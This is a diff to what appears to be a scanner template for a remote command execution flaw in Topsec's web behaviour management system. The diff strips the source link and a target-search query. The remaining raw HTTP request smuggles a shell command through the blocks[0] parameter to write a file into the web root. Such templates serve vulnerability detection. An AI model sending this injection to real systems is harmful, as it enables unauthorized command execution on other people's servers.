@@ -3,12 +3,8 @@ info:
   name: 天融信上网行为管理系统系远程命令执行
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tzkqhhyiq1pscqd1'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: tzkqhhyiq1pscqd1
-    fofa: app="天融信-上网行为管理系统"
 http:
 - raw:
   - 'GET /view/IPV6/naborTable/static_convert.php?blocks[0]=||%20echo%20''123''%20>>%20/var/www/html/1.txt%0A HTTP/1.1
